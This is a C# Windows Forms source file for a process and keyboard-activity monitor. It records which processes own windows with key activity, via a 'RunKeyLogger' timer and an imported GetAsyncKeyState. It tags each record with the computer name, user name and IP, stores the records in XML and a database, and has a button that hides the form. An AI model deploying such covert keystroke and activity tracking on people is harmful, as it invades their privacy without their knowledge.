using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net.NetworkInformation;
using System.Net.Sockets;

namespace CrcMrc
{
       

    public partial class Form2api : Form
    {
        const ProcessData PROCESS_DATA_NOT_FOUND = null;
        const ListViewItem PROCESS_ITEM_NOT_FOUND = null;

        [DllImport("user32.dll")]
        static extern IntPtr GetActiveWindow();

        [DllImport("user32")]
        private static extern UInt32 GetWindowThreadProcessId(Int32 hWnd , out Int32 lpdwProcessId);

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindowEx(IntPtr parentWindow, IntPtr previousChildWindow, string windowClass, string windowTitle);

        private Int32 GetWindowProcessID_(Int32 hwnd)
        {
            Int32 pid = 1;
            GetWindowThreadProcessId(hwnd, out pid);
            return pid;
        }

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);


        ArrayList ProcessDataList = new ArrayList();
        ArrayList IDList = new ArrayList();
        ListViewItem IdleProcessItem;
        dsProcess.ProcessDataTable pdt;
        common comm;
        DBConnect dbConnect;
        int bScrollActivity = 0;
        string localIPAddress = string.Empty;
        string compName = string.Empty;
        string compUser = string.Empty;

        uint pID = 0;


        public Form2api()
        {
            InitializeComponent();
            comm = new common();
            dbConnect = new DBConnect();
            InitVal();
            LoadXml();
            RefreshParameter();
            SaveToDB();
            ShowCountData();            
        }        

        private void InitVal()
        {
            pdt = new dsProcess.ProcessDataTable();

        }

        private void SaveXml()
        {
            pdt.WriteXml( CrcMrc.Properties.Settings.Default.FileDB );
            LogTo("SaveXML");
        }

        private void LoadXml()
        {
            if (File.Exists(CrcMrc.Properties.Settings.Default.FileDB))
            {
                //pdt = new dsProcess.ProcessDataTable();
                pdt.ReadXml(CrcMrc.Properties.Settings.Default.FileDB);
                LogTo("LoadXML");
            }
        }

        private void GetUsage()
        {
            
            ProcessEntry32 ProcessInfo = new ProcessEntry32();            
            ProcessTimes ProcessTimes = new ProcessTimes();
            IntPtr ProcessList, ProcessHandle = ProcessCPU.PROCESS_HANDLE_ERROR;
            ProcessData CurrentProcessData;
            int Index;
            int Total = 0;
            bool NoError;

            // this creates a pointer to the current process list
            ProcessList = ProcessCPU.CreateToolhelp32Snapshot(ProcessCPU.TH32CS_SNAPPROCESS, 0);

            if (ProcessList == ProcessCPU.PROCESS_LIST_ERROR) { return; }

            // we usage Process32First, Process32Next to loop threw the processes
            ProcessInfo.Size = ProcessCPU.PROCESS_ENTRY_32_SIZE;
            NoError = ProcessCPU.Process32First(ProcessList, ref ProcessInfo);
            IDList.Clear();

            ProcessView.SuspendLayout();

            while (NoError)
                try
                {
                    // we need a process handle to pass it to GetProcessTimes function
                    // the OpenProcess function will provide us the handle by the id
                    ProcessHandle = ProcessCPU.OpenProcess(ProcessCPU.PROCESS_ALL_ACCESS, false, ProcessInfo.ID);                    

                    // here's what we are looking for, this gets the kernel and user time
                    ProcessCPU.GetProcessTimes(
                        ProcessHandle,
                        out ProcessTimes.RawCreationTime,
                        out ProcessTimes.RawExitTime,
                        out ProcessTimes.RawKernelTime,
                        out ProcessTimes.RawUserTime);

                    // convert the values to DateTime values
                    ProcessTimes.ConvertTime();

                    //from here is just managing the gui for the process list
                    CurrentProcessData = ProcessExists(ProcessInfo.ID);
                    IDList.Add(ProcessInfo.ID);

                    if (CurrentProcessData == PROCESS_DATA_NOT_FOUND)
                    {
                        Index = ProcessDataList.Add(new ProcessData(
                            ProcessInfo.ID,
                            ProcessInfo.ExeFilename,
                            ProcessTimes.UserTime.Ticks,
                            ProcessTimes.KernelTime.Ticks));

                        AddProcess((ProcessData)ProcessDataList[Index]);
                    }
                    else
                    {
                        //TEST inline condition
                        Total += (CrcMrc.Properties.Settings.Default.CPUUseSwitch ? CurrentProcessData.UpdateCpuUsage(
                                    ProcessTimes.UserTime.Ticks,
                                    ProcessTimes.KernelTime.Ticks) : 0);
                    }
                }
                finally
                {
                    if (ProcessHandle != ProcessCPU.PROCESS_HANDLE_ERROR)
                        ProcessCPU.CloseHandle(ProcessHandle);

                    NoError = ProcessCPU.Process32Next(ProcessList, ref ProcessInfo);
                }

            ProcessCPU.CloseHandle(ProcessList);

            Index = 0;

            DateTime dt = (System.DateTime)DateTime.Now;

            while (Index < ProcessDataList.Count)
            {
                ProcessData TempProcess = (ProcessData)ProcessDataList[Index];
                dsProcess.ProcessRow row;
                row = pdt.NewProcessRow();
                row.CompName = compName; //GetCompName();
                row.CompUser = compUser; //GetCompUser();
                row.IP = localIPAddress; //GetIPAddress(); // GetLocalIpAddress();
                row.ProcesName = TempProcess.Name;
                row.CPUUse = TempProcess.CpuUsage;
                row.ProcTime = dt;
                row.ProcID = (Int32) TempProcess.ID;
                                
                string sProzori = String.Empty;
                IntPtr[] prozori = GetProcessWindows((int)TempProcess.ID);
                Int32[] lprozori = new Int32[prozori.Length];
                for (int j = 0; j < prozori.Length; j++)
                {                    
                    sProzori += "@" + prozori[j].ToInt32().ToString() + "@";
                    lprozori[j] = prozori[j].ToInt32();
                }

                Int32[] commonElements = comm.iHwnd.Intersect(lprozori).ToArray();
                Int32 commonElementsCounter = comm.iHwnd.Count() - comm.iHwnd.Except(lprozori).Count() ; 
                if (commonElements.Length > 0)
                {                    
                    row.counter = (short) commonElementsCounter; 
                    row.currWindID = commonElements[0].ToString();
                }

                row.hWindID = sProzori;

                if (row.counter > 0)
                {
                    pdt.AddProcessRow(row);
                    pdt.AcceptChanges();
                    LogTo("ADD  " + row.ProcID + "  " + row.ProcTime,true);
                }
                else
                {
                    //pdt.RemoveProcessRow(row);
                    row.Delete();
                    row = null;
                    pdt.RejectChanges();
                }
                

                if (IDList.Contains(TempProcess.ID))
                    Index++;
                else
                {
                    ProcessView.Items.Remove(TempProcess.ProcessItem);
                    ProcessDataList.RemoveAt(Index);
                }
            }

            IdleProcessItem.SubItems[2].Text = (100 - Total) + "%";

            ProcessView.ResumeLayout();

            comm.ResetCounter();

            SaveXml();

            ShowCountData();
        }
        

        private ProcessData ProcessExists(uint ID)
        {
            foreach (ProcessData TempProcess in ProcessDataList)
                if (TempProcess.ID == ID) return TempProcess;

            return PROCESS_DATA_NOT_FOUND;
        }

        private bool ProcessUpdated(uint ID)
        {
            foreach (uint UpdatedProcess in IDList)
                if (UpdatedProcess == ID) return true;

            return false;
        }

        private void UsageTimer_Tick(object sender, EventArgs e)
        {
            LogTo("Timer1 START");
            KeyTime.Stop();
            GetUsage();
            KeyTime.Start();
            LogTo("Timer1 STOP");
        }

        private void RunKeyLogger()
        {
            comm.LogKeys();
        }


        private void AddProcess(ProcessData NewProcess)
        {
            ListViewItem NewProcessItem = ProcessView.Items.Add(NewProcess.Name);

            NewProcessItem.SubItems.Add(NewProcess.ID.ToString());
            NewProcessItem.SubItems.Add("0%");

            NewProcess.ProcessItem = NewProcessItem;

            if (NewProcess.ID == 0)
                IdleProcessItem = NewProcessItem;
        }

        private IntPtr[] GetProcessWindows(int process)
        {
            IntPtr[] apRet = (new IntPtr[256]);
            int iCount = 0;
            IntPtr pLast = IntPtr.Zero;
            do
            {
                pLast = FindWindowEx(IntPtr.Zero, pLast, null, null);
                int iProcess_;
                GetWindowThreadProcessId((int)pLast, out iProcess_);
                if (iProcess_ == process) apRet[iCount++] = pLast;
            } while (pLast != IntPtr.Zero);
            System.Array.Resize(ref apRet, iCount);
            return apRet;
        }

        private string GetCompName()
        {
            //CrcMrc.Properties.Settings.Default.ComputerName. = Environment.MachineName + "|" + Dns.GetHostName();
            return Environment.MachineName + "|" + Dns.GetHostName();
        }

        private string GetCompUser()
        {
            return Environment.UserName + "|" + Environment.UserDomainName;
        }
                
        public string GetIPAddress()
        {
            IPHostEntry Host = default(IPHostEntry);
            string Hostname = null;
            string sIPAddress = null;
            //Hostname = System.Environment.MachineName;
            Hostname = Dns.GetHostName();
            Host = Dns.GetHostEntry(Hostname);
            foreach (IPAddress IP in Host.AddressList)
            {
                if (IP.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    //IPAddress = Convert.ToString(IP);
                    sIPAddress = Convert.ToString(IP);
                    return sIPAddress;
                }
            }
            return sIPAddress;
        }

        public string GetLocalIpAddress()
        {
            UnicastIPAddressInformation mostSuitableIp = null;

            var networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();

            foreach (var network in networkInterfaces)
            {
                if (network.OperationalStatus != OperationalStatus.Up)
                    continue;

                var properties = network.GetIPProperties();

                if (properties.GatewayAddresses.Count == 0)
                    continue;

                foreach (var address in properties.UnicastAddresses)
                {
                    if (address.Address.AddressFamily != AddressFamily.InterNetwork)
                        continue;

                    if (IPAddress.IsLoopback(address.Address))
                        continue;

                    if (!address.IsDnsEligible)
                    {
                        if (mostSuitableIp == null)
                            mostSuitableIp = address;
                        continue;
                    }

                    // The best IP is the IP got from DHCP server
                    if (address.PrefixOrigin != PrefixOrigin.Dhcp)
                    {
                        if (mostSuitableIp == null || !mostSuitableIp.IsDnsEligible)
                            mostSuitableIp = address;
                        continue;
                    }

                    return address.Address.ToString();
                }
            }

            return mostSuitableIp != null
                ? mostSuitableIp.Address.ToString()
                : "";
        }

        private void btnWriteXml_Click(object sender, EventArgs e)
        {
            SaveXml();
        }

        private void KeyTime_Tick(object sender, EventArgs e)
        {
            LogTo("Timer2 KeyLog");
            RunKeyLogger();
            ShowCountData();
        }

        private void TimerDB_Tick(object sender, EventArgs e)
        {
            LogTo("Timer3 DB START",true,true);            
            SaveToDB();
            SaveToDB();
            RefreshParameter();
            LogTo("Timer3 DB STOP");

        }

        private void RefreshParameter()
        {
            localIPAddress = GetLocalIpAddress();
            compName = GetCompName();
            compUser = GetCompUser();
        }

        private void SaveToDB()
        {
            //pdt.DefaultView.Sort = "[ID] ASC";

            if (dbConnect.OpenConnection() == false)
                return;

            for (int i = 0; i < pdt.Rows.Count; i++)
            {
                dsProcess.ProcessRow row;
                row = (dsProcess.ProcessRow)pdt.Rows[i];
                
                if (dbConnect.CheckProcess(row.ProcesName, row.ProcID, row.ProcTime, row.CompName, row.CompUser, row.IP) == false)
                {
                    dbConnect.InsertProcess(row.ProcesName, row.ProcID, row.ProcTime, row.CompName, row.CompUser, row.IP);
                    LogTo("DELETE  " + row.ProcID + "  " + row.ProcTime,true);
                    row.Delete();
                    if (pdt.Rows.Count > 0)
                    {
                        pdt.Rows.RemoveAt(i);
                        pdt.AcceptChanges();
                    }
                }
                else if (dbConnect.CheckProcess(row.ProcesName, row.ProcID, row.ProcTime, row.CompName, row.CompUser, row.IP) == true)
                {
                    LogTo("DELETE***  " + row.ProcID + "  " + row.ProcTime, true);
                    row.Delete();
                    if (pdt.Rows.Count > 0)
                    {
                        pdt.Rows.RemoveAt(i);
                        pdt.AcceptChanges();
                    }
                }
            }
        }

        private void Form2api_Leave(object sender, EventArgs e)
        {
            SaveXml();
        }

        /// <summary>
        /// Logon control
        /// </summary>
        /// <param name="mess">Description</param>
        /// <param name="logon">Write to log</param>
        /// <param name="scrolon">Scrol on this action</param>
        private void LogTo(string mess, Boolean logon = false, Boolean scrolon = false )
        { 
            string datum = DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");
            string[] row = { datum, mess };
            var listViewItem = new ListViewItem(row);
            lvLog.SuspendLayout();
            lvLog.Items.Add(listViewItem);
            //lvLog.EnsureVisible(lvLog.Items.Count - 1);

            if (CrcMrc.Properties.Settings.Default.Log_Command)
            {
                if (logon == true)
                {
                    string path = CrcMrc.Properties.Settings.Default.FileLOG;
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.WriteLine(datum.PadRight(22) + mess);
                    }
                }
            }

            if (chkScrollActivity.Checked)
            {
                bScrollActivity++;
            }

            //if (scrolon == true)
            if(bScrollActivity > 8 || scrolon == true)
            {
                //lvLog.SuspendLayout();
                lvLog.EnsureVisible(lvLog.Items.Count -1);
                bScrollActivity = 0;                
            }
            lvLog.ResumeLayout();
        }

        private void btnUsageTimer_Click(object sender, EventArgs e)
        {
            if (UsageTimer.Enabled == true)
                UsageTimer.Enabled = false;
            else
                UsageTimer.Enabled = true;                
        }

        private void btnKeyTime_Click(object sender, EventArgs e)
        {
            if (KeyTime.Enabled == true)
                KeyTime.Enabled = false;
            else
                KeyTime.Enabled = true;
        }

        private void btnTimerDB_Click(object sender, EventArgs e)
        {
            if (TimerDB.Enabled == true)
                TimerDB.Enabled = false;
            else
                TimerDB.Enabled = true;
        }

        private void ShowCountData()
        {
            lblProcess.Text = ProcessDataList.Count.ToString();
            lblDataSet.Text = pdt.Rows.Count.ToString();
            lblKeyLog.Text = comm.iHwnd.Length.ToString();

            lblDBState.Text = dbConnect.connection.State.ToString();
            lblDBCount.Text = dbConnect.Count("process").ToString();
        }

        private void lvLog_Leave(object sender, EventArgs e)
        {
            SaveXml();
        }

        private void btnHide_Click(object sender, EventArgs e)
        {
            LogTo("Autohide");
            this.Hide();
        }
        

        private void btnProces_Click(object sender, EventArgs e)
        {
            // you must find process active
            // if is not active then go to active
            if (bProcess() == false)
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "Notepad2.exe";
                //startInfo.Arguments = file;
                Process.Start(startInfo);
            }
                

        }

        private bool bProcess(string AppName = "notepad.exe")
        {
            pID = 0;

            Process[] proc;

            proc = Process.GetProcesses();
            foreach(Process pprc in proc)
            {
                if( pprc.ProcessName.Contains(AppName) )
                {
                    pID = (uint) pprc.Id;
                    return true;
                }
            }

            return false;

        }

        
    }
}